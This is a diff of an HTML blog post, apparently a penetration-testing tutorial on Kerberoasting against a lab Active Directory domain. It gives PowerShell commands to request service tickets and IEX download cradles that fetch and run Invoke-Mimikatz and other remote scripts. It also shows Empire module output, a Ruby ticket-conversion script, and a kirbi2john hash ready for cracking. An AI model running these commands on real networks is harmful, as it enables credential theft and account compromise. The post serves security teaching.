@@ -25,20 +25,20 @@
 &lt;p&gt;These are stolen directly from &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/README.md&#34;&gt;Kerberoast repository README.md&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;One specific ticket:&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;This is great if you are targeting one specific user account:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel  
-PS C:\&amp;gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &amp;quot;HTTP/web01.medin.local&amp;quot;  
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel  
+PS C:\&amp;gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &amp;#34;HTTP/web01.medin.local&amp;#34;  
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;All the tickets (including Computer account tickets):&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;I&amp;rsquo;m not a huge fan of this method since you get too many tickets to deal with but it&amp;rsquo;s a great example of how to use PowerShell to parse and request things like this:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel  
-PS C:\&amp;gt; setspn.exe -T medin.local -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel  
+PS C:\&amp;gt; setspn.exe -T medin.local -Q */* | Select-String &amp;#39;^CN&amp;#39; -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;powershell-requesting---just-users&#34;&gt;PowerShell Requesting - Just Users&lt;/h3&gt;
 &lt;p&gt;&lt;strong&gt;Getting just the User tickets:&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;This is a slightly modified version of Tim&amp;rsquo;s script from above. It pulls down his GetUserSPNs powershell script instead of using &lt;code&gt;SetSPN.exe&lt;/code&gt; and makes a request for each of the resulting SPN tickets.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel
-PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&amp;quot;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel
+PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;#34;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&amp;#34;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;empire&#34;&gt;Empire&lt;/h3&gt;
 &lt;p&gt;PowerShell Empire received the functionality to get the SPN Tickets via &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt;&amp;rsquo;s commit here: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639&#34;&gt;b977dec&lt;/a&gt; which as of the writing of this post was still in the &lt;code&gt;dev&lt;/code&gt; branch of Empire (not master yet)&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;(Empire: BDW3E2G2ZRKCUS3B) &amp;gt; usemodule credentials/get_spn_tickets
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(Empire: BDW3E2G2ZRKCUS3B) &amp;gt; usemodule credentials/get_spn_tickets
 (Empire: credentials/get_spn_tickets) &amp;gt; info
 
            Name: Get-SPNTickets
@@ -98,11 +98,11 @@ Get-SPNTickets completed!
 &lt;h3 id=&#34;mimikatz&#34;&gt;Mimikatz&lt;/h3&gt;
 &lt;p&gt;Using the &lt;strong&gt;&lt;code&gt;kerberos::list /export&lt;/code&gt;&lt;/strong&gt; functionality is awesome, but this will generate a file per-ticket. I have been on a few engagements where that meant 4000+ files. Luckily the awesome &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; saves us and has included a &amp;ldquo;base64&amp;rdquo; mode for Mimikatz&lt;/p&gt;
 &lt;p&gt;So here I&amp;rsquo;m simply pulling the &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; script that &lt;a href=&#34;https://twitter.com/JosephBialek&#34;&gt;@JosephBialek&lt;/a&gt; &amp;ldquo;clymb3r&amp;rdquo; created, into memory, telling Mimikatz to go in &amp;ldquo;base64&amp;rdquo; mode, export all of the active tickets and exit.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;quot;)
-PS C:\&amp;gt; Invoke-Mimikatz -Command &#39;standard::base64 &amp;quot;kerberos::list /export&amp;quot; exit&#39;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;#34;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;#34;)
+PS C:\&amp;gt; Invoke-Mimikatz -Command &amp;#39;standard::base64 &amp;#34;kerberos::list /export&amp;#34; exit&amp;#39;
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;empire-1&#34;&gt;Empire&lt;/h3&gt;
 &lt;p&gt;Here is the module:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;(Empire: agents) &amp;gt; usemodule credentials/mimikatz/extract_tickets
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(Empire: agents) &amp;gt; usemodule credentials/mimikatz/extract_tickets
 (Empire: credentials/mimikatz/extract_tickets) &amp;gt; info
 
            Name: Invoke-Mimikatz extract kerberos tickets.
@@ -118,7 +118,7 @@ Authors:
   @gentilkiwi
 
 Description:
-  Runs PowerSploit&#39;s Invoke-Mimikatz function to extract
+  Runs PowerSploit&amp;#39;s Invoke-Mimikatz function to extract
   kerberos tickets from memory in base64-encoded form.
 
 Options:
@@ -127,14 +127,14 @@ Options:
   ----  --------    -------                   -----------
   Agent True        None                      Agent to run module on.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the result&amp;hellip;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Job started: Debug32_segox
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Job started: Debug32_segox
 Hostname: win7.sittingduck.info / S-1-5-21-4217918325-2978756054-1117708521
   .#####.   mimikatz 2.1 (x64) built on Mar 31 2016 16:45:32
- .## ^ ##.  &amp;quot;A La Vie, A L&#39;Amour&amp;quot;
+ .## ^ ##.  &amp;#34;A La Vie, A L&amp;#39;Amour&amp;#34;
  ## / \ ##  /* * *
  ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
-  &#39;#####&#39;                                     with 18 modules * * */
+ &amp;#39;## v ##&amp;#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  &amp;#39;#####&amp;#39;                                     with 18 modules * * */
 
 mimikatz(powershell) # standard::base64
 isBase64Intercept was    : false
@@ -167,45 +167,45 @@ GxBTSVRUSU5HRFVDSy5JTkZP
    * Saved to file     : 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;ve cut the result down quite a bit as it would scroll for a bit in this format.&lt;/p&gt;
 &lt;p&gt;Now the problem is that they are all text and for you to crack things or at least convert them into a format that JtR or oclHastcat can digest they need to be in binary format. So I made this script to convert and &lt;code&gt;agent.log&lt;/code&gt; file from the output of &lt;strong&gt;&lt;code&gt;extract_tickets&lt;/code&gt;&lt;/strong&gt; back into their binary format with correct file names. My coding isn&amp;rsquo;t great, so please let me know how I can improve this script:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
-require &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;
-
-puts &lt;span style=&#34;color:#66d9ef&#34;&gt;ARGV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inspect
-
-&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ARGV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;length &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-	puts &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Requires a file to parse, usually agent.log&amp;#34;&lt;/span&gt;
-	exit
-&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-
-border &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;====================&amp;#34;&lt;/span&gt;
-bordercount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-ticket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
-filename &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed.log&amp;#34;&lt;/span&gt;
-
-&lt;span style=&#34;color:#66d9ef&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(&lt;span style=&#34;color:#66d9ef&#34;&gt;ARGV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;line&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; border
-		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; bordercount
-		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
-			&lt;span style=&#34;color:#66d9ef&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(filename, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;) {&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#66d9ef&#34;&gt;Base64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode64(ticket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join))}
-			bordercount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-			ticket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
-			filename &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed.log&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
-			bordercount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bordercount &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-		&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
-		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; bordercount
-		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-			filename &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; : &amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-			puts &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Storing &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;filename&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
-		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
-			ticket &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip
-		&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Save that and just feed it an &lt;code&gt;agent.log&lt;/code&gt; file from Empire and WA-LA! you have kirbi files.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;ruby parse.rb agent.log
-[&amp;quot;agent.log&amp;quot;]
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;require &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;puts &lt;span style=&#34;color:#66d9ef&#34;&gt;ARGV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inspect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ARGV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;length &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	puts &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Requires a file to parse, usually agent.log&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	exit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;border &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;====================&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bordercount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ticket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;filename &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed.log&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(&lt;span style=&#34;color:#66d9ef&#34;&gt;ARGV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;line&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; border
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; bordercount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(filename, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;) {&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#66d9ef&#34;&gt;Base64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode64(ticket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join))}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			bordercount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			ticket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			filename &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed.log&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			bordercount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bordercount &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; bordercount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			filename &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; : &amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			puts &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Storing &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;filename&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			ticket &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Save that and just feed it an &lt;code&gt;agent.log&lt;/code&gt; file from Empire and WA-LA! you have kirbi files.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ruby parse.rb agent.log
+[&amp;#34;agent.log&amp;#34;]
 Storing 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
 Storing 1-40e10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
 Storing 2-40a10000-notanadmin@MSSQLSvc~WIN2K8R2.sittingduck.info-SITTINGDUCK.INFO.kirbi
@@ -224,7 +224,7 @@ Storing 10-40a50000-notanadmin@LDAP~DC1.sittingduck.info~sittingduck.info-SITTIN
 &lt;li&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/kirbi2john.py&#34;&gt;Kerberoast version of kirbi2john.py by Michael Kramer (SySS GmbH)&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/kirbi2john.py&#34;&gt;John the Ripper&amp;rsquo;s version of kirbi2john.py by Michael Kramer - modded by Dhiru Kholia&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;pre&gt;&lt;code&gt;root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi
 $krb5tgs$unkown:9e5ac5797343aabcb3ddc67df0f0fd88$d4c32f942980778547498a30f656d54f7c71a700397fa53dbe5ee86ee2e30e89586c8d447f6df8489fc1b53241cf87777712d5b1a0ebf066df08b12138a52b40aab0c25c00fd1db222f06e10277771315f3be538728a140abe9f2780761197c51f3d70fe630b898539bc3aa0d688ad848110d85fd55db5692d269e45a154410784f430084c2aa1190f95cda4d13a5463418c94d016af7ff36adf2f49b80e42d73a75b12f2ea210bf663e0fdeb42e0ff0b416bbf5056cd7f87a7c122fddec81daba5d5eb390073e76fff48139281cef9c8b88af4229689ad018b432d4ecb2c4d673810bef6096507caeb9cfe963a0201cea0bdd4a58b93c72ab238dd69c48b72a189dfcac541052156659c1d1ab3ce7ee2882b93b11ba5b14679105de476e3953d5ceb7328a5d221cfd323b7deb8234be1bf0d4b8c9f02463ad6da667323478f7acba2424e4311c837db608fc27b25a24d6c1315d7927d165a0859460ed65aaabaffd488b23dfcb01c8866aad556831370e89c25a6d8843aae676186f927eadf86f187d355f4a1d97472a44dc32fc52c4b6c40f42bb84f8589ee607eff2fd511bb6eaae90640a6dd2b3557ae5ae992d025aa13c25fafe9bd5b93aa36834a715c5dcde96bda38b880797852d2cff13324a1751a9b198b60ebf81c96b8dc5edf1474fe1fa53628f3aa53416e4062c503f1efb22a8ce11ab7ba8c40bc30c816568091ad051c55b3c8780964c87b5db241224bd3280eecb7e73f2921c770ccf41fbea8e43b2a1be0c6178c799fdbe8d1fffdd4a37a2aeeebb27a4f09f669203969b80e1ab7d6e28cae00af7fd3a6c731448c97356759ecc3eefec7f6ef155bd63b84bb25b1b66f8f1908ece15dbba12219c80b6797e04315889790f9c06c611314f8cd
